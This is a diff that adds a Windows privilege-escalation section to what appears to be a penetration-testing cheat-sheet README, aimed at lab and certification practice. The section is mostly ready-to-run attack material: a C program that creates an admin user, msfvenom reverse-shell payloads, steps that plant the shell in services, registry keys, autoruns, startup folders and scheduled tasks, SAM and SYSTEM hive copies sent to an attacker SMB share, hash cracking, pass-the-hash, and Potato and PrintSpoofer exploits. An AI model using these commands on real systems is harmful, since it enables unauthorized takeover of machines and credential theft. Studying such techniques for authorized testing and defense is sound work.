@@ -149,6 +149,22 @@ EasyG started out as a script that I use to automate some information gathering 
     - [Passwords & Keys](#passwords--keys)
     - [NFS](#nfs)
     - [Kernel Exploits](#kernel-exploits)
+  - [Windows Privilege Escalation](#windows-privilege-escalation)
+    - [Resources](#resources)
+    - [Privileges](#privileges)
+    - [Strategy](#strategy-1)
+    - [Add new admin user](#add-new-admin-user)
+    - [Generate a reverse shell](#generate-a-reverse-shell)
+    - [Kernel Exploits](#kernel-exploits)
+    - [Service Exploits](#service-exploits)
+    - [Registry](#registry)
+    - [Passwords](#passwords)
+    - [Scheduled Tasks](#scheduled-tasks)
+    - [Installed Applications](#installed-applications)
+    - [Startup Apps](#startup-apps)
+    - [Hot Potato](#hot-potato)
+    - [Token Impersonation](#token-impersonation)
+    - [getsystem](#getsystem)
   - [Buffer Overflow](#buffer-overflow)
 - [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
   - [Prompt Injection](#prompt-injection)
@@ -3518,6 +3534,235 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
   - Find possible exploits with [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
   - [Dirty COW | CVE-2016-5195](https://dirtycow.ninja/)
   - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)
+
+
+### <ins>Windows Privilege Escalation</ins>
+
+#### <ins>Resources</ins>
+- [Windows PrivEsc | TryHackMe](https://tryhackme.com/room/windows10privesc)
+- [Windows Privilege Escalation for OSCP & Beyond!](https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574)
+
+**Tools**
+- [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
+- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
+- [MinGW-w64](https://www.mingw-w64.org/)
+- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
+- [Windows persistence](#windows-persistence)
+- Scripts
+  - [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+  - [Seatbelt](https://github.com/GhostPack/Seatbelt)
+    - [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
+      - `.\Seatbelt.exe all`
+  - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) (archived)
+    - [SharpUp](https://github.com/GhostPack/SharpUp)
+    - [SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
+  - [Windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
+    - `windows-privesc-check2.exe -h`
+    - `windows-privesc-check2.exe --dump -G`
+  - [creddump7](https://github.com/Tib3rius/creddump7)
+
+#### <ins>Privileges</ins>
+- Paper: [Abusing Token Privileges For EoP](https://github.com/hatRiot/token-priv)
+- List your privileges: `whoami /priv`
+  - `SeImpersonatePrivilege`
+  - `SeAssignPrimaryPrivilege`
+  - `SeBackupPrivilege`
+  - `SeRestorePrivilege`
+  - `SeTakeOwnershipPrivilege`
+  - `SeTcbPrivilege`
+  - `SeCreateTokenPrivilege`
+  - `SeLoadDriverPrivilege`
+  - `SeDebugPrivilege`
+
+#### <ins>Strategy</ins>
+
+1. Check your user (`whoami`) and groups (`net user <username>`)
+2. Run winPEAS with fast, searchfast, and cmd options
+   - Run Seatbelt & other scripts
+   - Check also: [PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+3. Have a quick look around for files in your user’s desktop and other common locations
+   - Read through interesting files
+4. Try things that don’t have many steps first (e.g. registry exploits, services, etc.)
+5. Look at admin processes, enumerate their versions and search for exploits
+6. Check for internal ports that you might be able to forward to your attacking machine
+
+#### <ins>Add new admin user</ins>
+
+```C
+#include <stdlib.h>
+int main () {
+    int i;
+    i = system ("net user /add [username] [password]");
+    i = system ("net localgroup administrators [username] /add");
+    return 0;
+}
+```
+- 32-bit Windows executable: `i686-w64-mingw32-gcc adduser.c -o adduser.exe`
+- 64-bit Windows executable: `x86_64-w64-mingw32-gcc -o adduser.exe adduser.c`
+- Note: [32-bit and 64-bit Windows: Frequently asked questions](https://support.microsoft.com/en-us/windows/32-bit-and-64-bit-windows-frequently-asked-questions-c6ca9541-8dce-4d48-0415-94a3faa2e13d)
+
+#### <ins>Generate a reverse shell</ins>
+1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
+2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
+
+Check also: [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
+
+#### <ins>Kernel Exploits</ins>
+
+1. Save the output of the `systeminfo` command: `systeminfo > systeminfo.txt`
+2. Use it with Windows Exploit Suggester to find potential exploits: `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
+   - See also: [Watson](https://github.com/rasta-mouse/Watson)
+3. See [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
+#### <ins>Service Exploits</ins>
+
+Note: to find running services, use this command from the powershell: `Get-Service` or `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
+
+**Service Commands**
+```
+sc.exe qc <name>                                 Query the configuration of a service
+sc.exe query <name>                              Query the current status of a service
+sc.exe config <name> <option>= <value>           Modify a configuration option of a service
+net start/stop <name>                            Start/Stop a service
+```
+
+**Insecure Service Permissions**
+1. Use AccessChk to check the "user" account's permissions on the "daclsvc" service:
+   - `C:\PrivEsc\accesschk.exe /accepteula -uwcqv <user> <service>`
+2. If `SERVICE_CHANGE_CONFIG` is present, it's possible to change the service configuration
+3. Query the service. If it runs with `SYSTEM` privileges, it's possible a privilege escalation
+   - `sc qc <service>`
+   - Example: `SERVICE_START_NAME: LocalSystem`
+4. Modify the service config and set the `BINARY_PATH_NAME` (binpath) to the reverse shell executable
+   - `sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""`
+5. Set a listener and start the service `net start <service>`
+
+**Unquoted Service Path**
+1. Check: ["Microsoft Windows Unquoted Service Path Vulnerability"](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)
+2. Query a service. If it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`) and the `BINARY_PATH_NAME` value is unquoted and contains spaces, it's possible a privilege escalation
+   - `sc qc <service>`
+   - Example: `BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Results\unquotedpathservice.exe`
+3. Use AccessChk to check write permissions in this directory `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
+4. Copy the reverse shell `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
+5. Start a listener on the attacker machine and run the service
+
+**Weak Registry Permissions**
+1. Query a service. Check if it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`)
+   - `sc qc <service>`
+2. Use AccessChk to check the write permissions of the registry entry for the service
+   - note: `NT AUTHORITY\INTERACTIVE` group means all logged-on users
+   - `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>`
+3. Overwrite the ImagePath registry key to point to the reverse shell executable: `reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
+4. Start a listener on the attacker machine and run the service
+
+**DLL Hijacking**
+- See: [DLL Hijacking](#dll-hijacking)
+
+
+#### <ins>Registry</ins>
+
+**AutoRuns**
+1. Query the registry for AutoRun executables: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+2. Use AccessChk to check write permissions of the executables `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\<program>.exe"`
+3. Overwrite the reverse shell executables in the `<program>` path: `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
+4. Start a listener on the attacker machine. A new session on the victim machine will trigger a reverse shell running with admin privileges
+
+**AlwaysInstallElevated**
+1. Query the registry for AlwaysInstallElevated keys: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+   - Note if both keys are set to 1 (`0x1`)
+2. Generate a reverse shell installer `.msi` with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi`
+3. Transfer the installer `.msi` to the Windows machine
+4. Start a listener on the attacker machine and then run the installer to trigger a reverse shell running with SYSTEM privileges: `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
+
+#### <ins>Passwords</ins>
+
+**Registry**
+1. Search for keys and values that contain the word "password": `reg query HKLM /f password /t REG_SZ /s`
+2. If you have found and admin and its password, use [winexe](https://www.kali.org/tools/winexe/) command from the attacker machine to spawn a command prompt running with the admin privileges `winexe -U 'admin%password' //<IP> cmd.exe`
+
+**Saved Credentials**
+1. Check for any saved credentials `cmdkey /list`
+2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+
+**Search for Configuration Files**
+1. Run the commands: `dir /s *pass* == *.config` and ` findstr /si password *.xml *.ini *.txt`
+2. Use winPEAS to search for common files which may contain credentials: `.\winPEASany.exe quiet cmd searchfast filesinfo`
+
+**Security Account Manager (SAM)**
+1. The `SAM` and `SYSTEM` files can be used to extract user password hashes. Check also backups of these files
+   - `copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`
+   - `copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
+2. Dump the hashes with "creddump7": `python3 creddump7/pwdump.py SYSTEM SAM`
+3. Crack the hashes with `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
+
+**Passing The Hash**
+1. Use the hashes to authenticate: `pth-winexe -U 'admin%hash' //<IP Victim> cmd.exe`
+
+#### <ins>Scheduled Tasks</ins>
+
+1. List all scheduled tasks your user can see:
+   - `schtasks /query /fo LIST /v`
+   - In PowerShell: `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
+2. Search in Task Manager for any scheduled task. See if you find any `.ps1` script.
+3. If the script found run as `SYSTEM`, check the write permissions of it with `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\<script>.ps1`
+4. Add to it a line to run the reverse shell `echo C:\PrivEsc\reverse.exe >> C:\<script>.ps1`
+
+
+#### <ins>Insecure GUI Apps</ins>
+1. Open an app. Look at the privilege level it runs with `tasklist /V | findstr mspaint.exe`
+2. If the app runs with admin privileges and gives the possibility to open a file dialog box, click in the navigation input and paste: `file://c:/windows/system32/cmd.exe`
+
+#### <ins>Startup Apps</ins>
+1. Note if `BUILTIN\Users` group can write files to the StartUp directory: `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
+2. Using cscript, run the following script to create a new shortcut of the reverse shell executable in the StartUp directory:
+   - ```VBScript
+     Set oWS = WScript.CreateObject("WScript.Shell")
+     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+     Set oLink = oWS.CreateShortcut(sLinkFile)
+     oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+     oLink.Save
+     ```
+
+#### <ins>Installed Applications</ins>
+1. Manually enumerate all running programs: `tasklist /v`
+   - With seatbelt: `.\seatbelt.exe NonstandardProcesses`
+   - With winPEAS: `.\winPEASany.exe quiet procesinfo`
+2. Search for the applications' versions
+   - Try running the executable with `/?` or `-h,` as well as checking config or text files in the `Program Files` directory
+3. Use Exploit-DB to search for a corresponding exploit
+
+#### <ins>Hot Potato</ins>
+Note: This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
+1. See [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato), get the exploit [here](https://github.com/foxglovesec/Potato)
+2. Start a listener on the attacker machine
+3. Run the exploit: `.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
+4. Wait for a Windows Defender update (or trigger one manually)
+
+#### <ins>Token Impersonation</ins>
+
+
+**[RoguePotato](https://github.com/antonioCoco/RoguePotato)**
+1. See [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
+2. Set up a socat redirector on the attacker machine, forwarding its port 135 to port 9999 on Windows `sudo socat tcp-listen:135,reuseaddr,fork tcp:<Windows IP>:9999`
+3. Execute the PoC: `.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999`
+4. Check [Juicy Potato](https://github.com/ohpe/juicy-potato), it's an improved version
+
+**More Potatoes**
+- See: [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
+
+**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)**
+1. Copy `PSExec64.exe` and the `PrintSpoofer.exe` exploit executable over the Windows machine
+2. Start a listener on the attacker machine
+3. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: `C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+4. Start another listener on the attacker machine
+5. Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges: `C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"`
+
+
+#### <ins>getsystem</ins>
+- **Access Tokens**: When a user first logs in, this object is created and linked to their active session. A copy of the user's principal access token is added to the new process when they launch it.
+- **Impersonation Access Token**: When a process or thread momentarily needs to run with another user's security context, this object is created.
+- **Token Duplication**: Windows permits processes and threads to use multiple access tokens. This allows for the duplication of an impersonation access token into a main access token. If we have the ability to inject into a process, we can leverage this feature to copy the process's access token and launch a new process with the same rights.
+- **Documentation**: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
 
 
 ### <ins>Buffer Overflow</ins>
